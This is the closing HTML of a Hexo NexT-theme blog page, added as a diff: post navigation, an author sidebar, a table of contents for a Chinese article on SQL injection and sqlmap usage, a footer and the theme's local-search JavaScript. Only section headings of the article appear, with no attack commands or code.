+              <a href="/2020/05/28/BUUCTF%E5%B9%B3%E5%8F%B0web/" rel="next" title="记录BUUCTF平台web题目（一）">
+                <i class="fa fa-chevron-left"></i> 记录BUUCTF平台web题目（一）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/07/10/sqlmap%E8%AF%A6%E7%BB%86%E5%8F%82%E6%95%B0%E4%BD%BF%E7%94%A8/" rel="prev" title="sqlmap详细参数使用">
+                sqlmap详细参数使用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/mao.jpeg"
+                alt="alin" />
+            
+              <p class="site-author-name" itemprop="name">alin</p>
+              <p class="site-description motion-element" itemprop="description">走出菜鸟阵营</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、了解sql注入"><span class="nav-number">1.</span> <span class="nav-text">一、了解sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql注入"><span class="nav-number">1.0.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">1.0.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#定义"><span class="nav-number">1.0.3.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#特点"><span class="nav-number">1.0.4.</span> <span class="nav-text">特点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入过程"><span class="nav-number">1.0.5.</span> <span class="nav-text">注入过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入方法"><span class="nav-number">1.0.6.</span> <span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#数字型注入"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">数字型注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#字符型注入"><span class="nav-number">1.0.6.2.</span> <span class="nav-text">字符型注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击手法"><span class="nav-number">1.0.7.</span> <span class="nav-text">攻击手法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#基于布尔的盲注"><span class="nav-number">1.0.7.1.</span> <span class="nav-text">基于布尔的盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">1.0.7.2.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#联合查询注入"><span class="nav-number">1.0.7.3.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#基于错误信息的注入"><span class="nav-number">1.0.7.4.</span> <span class="nav-text">基于错误信息的注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入防范措施"><span class="nav-number">1.0.8.</span> <span class="nav-text">注入防范措施</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#分级管理"><span class="nav-number">1.0.8.1.</span> <span class="nav-text">分级管理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参数传值"><span class="nav-number">1.0.8.2.</span> <span class="nav-text">参数传值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#基础过滤与二次过滤"><span class="nav-number">1.0.8.3.</span> <span class="nav-text">基础过滤与二次过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用安全参数"><span class="nav-number">1.0.8.4.</span> <span class="nav-text">使用安全参数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞扫描"><span class="nav-number">1.0.8.5.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#多层验证"><span class="nav-number">1.0.8.6.</span> <span class="nav-text">多层验证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#数据库信息加密"><span class="nav-number">1.0.8.7.</span> <span class="nav-text">数据库信息加密</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、了解sqlmap"><span class="nav-number">2.</span> <span class="nav-text">二、了解sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.0.1.</span> <span class="nav-text">sqlmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sqlmap是什么"><span class="nav-number">2.0.2.</span> <span class="nav-text">Sqlmap是什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#下载安装sqlmap"><span class="nav-number">2.0.3.</span> <span class="nav-text">下载安装sqlmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap参数"><span class="nav-number">2.0.4.</span> <span class="nav-text">sqlmap参数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#选项"><span class="nav-number">2.0.4.1.</span> <span class="nav-text">选项</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#目标"><span class="nav-number">2.0.4.2.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#请求"><span class="nav-number">2.0.4.3.</span> <span class="nav-text">请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#优化"><span class="nav-number">2.0.4.4.</span> <span class="nav-text">优化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注入"><span class="nav-number">2.0.4.5.</span> <span class="nav-text">注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#检测"><span class="nav-number">2.0.4.6.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#技巧"><span class="nav-number">2.0.4.7.</span> <span class="nav-text">技巧</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#指纹"><span class="nav-number">2.0.4.8.</span> <span class="nav-text">指纹</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#枚举"><span class="nav-number">2.0.4.9.</span> <span class="nav-text">枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#暴力"><span class="nav-number">2.0.4.10.</span> <span class="nav-text">暴力</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#自定义函数注入"><span class="nav-number">2.0.4.11.</span> <span class="nav-text">自定义函数注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#访问文件系统"><span class="nav-number">2.0.4.12.</span> <span class="nav-text">访问文件系统</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#操作系统访问"><span class="nav-number">2.0.4.13.</span> <span class="nav-text">操作系统访问</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows注册表访问"><span class="nav-number">2.0.4.14.</span> <span class="nav-text">Windows注册表访问</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注入技术"><span class="nav-number">2.0.4.15.</span> <span class="nav-text">注入技术</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#测试是否是注入"><span class="nav-number">2.0.4.16.</span> <span class="nav-text">测试是否是注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设定延迟注入的时间"><span class="nav-number">2.0.4.17.</span> <span class="nav-text">设定延迟注入的时间</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设定UNION查询字段数"><span class="nav-number">2.0.4.18.</span> <span class="nav-text">设定UNION查询字段数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设定UNION查询使用的字符"><span class="nav-number">2.0.4.19.</span> <span class="nav-text">设定UNION查询使用的字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二阶SQL注入"><span class="nav-number">2.0.4.20.</span> <span class="nav-text">二阶SQL注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一般选项"><span class="nav-number">2.0.4.21.</span> <span class="nav-text">一般选项</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#其他"><span class="nav-number">2.0.4.22.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap实际利用"><span class="nav-number">2.1.</span> <span class="nav-text">sqlmap实际利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#检测和利用SQL注入"><span class="nav-number">2.1.1.</span> <span class="nav-text">检测和利用SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#手工判断是否存在漏洞"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">手工判断是否存在漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlmap自动检测"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">sqlmap自动检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#寻找和判断"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">寻找和判断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#批量检测"><span class="nav-number">2.1.1.4.</span> <span class="nav-text">批量检测</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#直接连接数据库"><span class="nav-number">2.1.2.</span> <span class="nav-text">直接连接数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库相关操作"><span class="nav-number">2.1.3.</span> <span class="nav-text">数据库相关操作</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP实用技巧"><span class="nav-number">2.2.</span> <span class="nav-text">SQLMAP实用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql的注释方法进行绕过WAF进行SQL注入"><span class="nav-number">2.2.1.</span> <span class="nav-text">mysql的注释方法进行绕过WAF进行SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#URL重写SQL注入测试"><span class="nav-number">2.2.2.</span> <span class="nav-text">URL重写SQL注入测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列举并破解密码哈希值"><span class="nav-number">2.2.3.</span> <span class="nav-text">列举并破解密码哈希值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取表中的数据个数"><span class="nav-number">2.2.4.</span> <span class="nav-text">获取表中的数据个数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#对网站secbang-com进行漏洞爬取"><span class="nav-number">2.2.5.</span> <span class="nav-text">对网站secbang.com进行漏洞爬取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于布尔SQL注入预估时间"><span class="nav-number">2.2.6.</span> <span class="nav-text">基于布尔SQL注入预估时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用hex避免字符编码导致数据丢失"><span class="nav-number">2.2.7.</span> <span class="nav-text">使用hex避免字符编码导致数据丢失</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模拟测试手机环境站点"><span class="nav-number">2.2.8.</span> <span class="nav-text">模拟测试手机环境站点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#智能判断测试"><span class="nav-number">2.2.9.</span> <span class="nav-text">智能判断测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#结合burpsuite进行注入"><span class="nav-number">2.2.10.</span> <span class="nav-text">结合burpsuite进行注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap自动填写表单注入"><span class="nav-number">2.2.11.</span> <span class="nav-text">sqlmap自动填写表单注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读取linux下文件"><span class="nav-number">2.2.12.</span> <span class="nav-text">读取linux下文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#延时注入"><span class="nav-number">2.2.13.</span> <span class="nav-text">延时注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap-结合burpsuite进行post注入"><span class="nav-number">2.2.14.</span> <span class="nav-text">sqlmap 结合burpsuite进行post注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap-cookies注入"><span class="nav-number">2.2.15.</span> <span class="nav-text">sqlmap cookies注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql提权"><span class="nav-number">2.2.16.</span> <span class="nav-text">mysql提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#执行shell命令"><span class="nav-number">2.2.17.</span> <span class="nav-text">执行shell命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#延时注入-1"><span class="nav-number">2.2.18.</span> <span class="nav-text">延时注入</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">alin</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
